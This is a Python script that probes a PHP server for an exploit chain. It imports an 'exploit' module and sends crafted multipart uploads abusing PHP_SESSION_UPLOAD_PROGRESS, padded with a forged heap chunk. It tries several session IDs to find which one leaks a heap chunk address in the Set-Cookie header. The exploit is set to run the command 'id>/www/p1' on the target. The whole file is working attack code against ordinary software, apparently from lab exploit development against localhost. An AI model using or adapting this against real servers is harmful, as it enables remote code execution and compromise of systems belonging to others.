#!/usr/bin/env python3
"""Try different SID formats on the stage-1 B request for a given port, to
see which produces a Set-Cookie (and whether it leaks heap)."""
import sys, os, time, struct
sys.path.insert(0, r"C:\Users\likat\p2s52704")
import exploit

PORT = int(sys.argv[1])
SIDS = {
    "orig19": b"attacksessionid0001",
    "hex32": b"a" * 32,
    "hex32b": b"deadbeef" * 4,
    "hex26": b"c" * 26,
}
t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=60, verbose=False)
ex = exploit.Exploit(t, "id>/www/p1", huge_mb=256, verbose=False, profile="bookworm")

for label, sid in SIDS.items():
    ex.rotate()
    # A request
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ex._file_part(), ex._big_field(),
    ]
    t.post(exploit.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)
    # B request with this SID
    parts = [
        {"name": "PHPSESSID", "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(ex.stage1_n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(exploit.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    raw = exploit.parse_cookie(resp)
    base = exploit.chunk_base_from_cookie(raw)
    print(f"  SID={label}({len(sid)}B) -> cookie={len(raw)}B "
          f"chunk=0x{base:x}" if base else f"  SID={label}({len(sid)}B) -> cookie={len(raw)}B (no chunk)",
          flush=True)
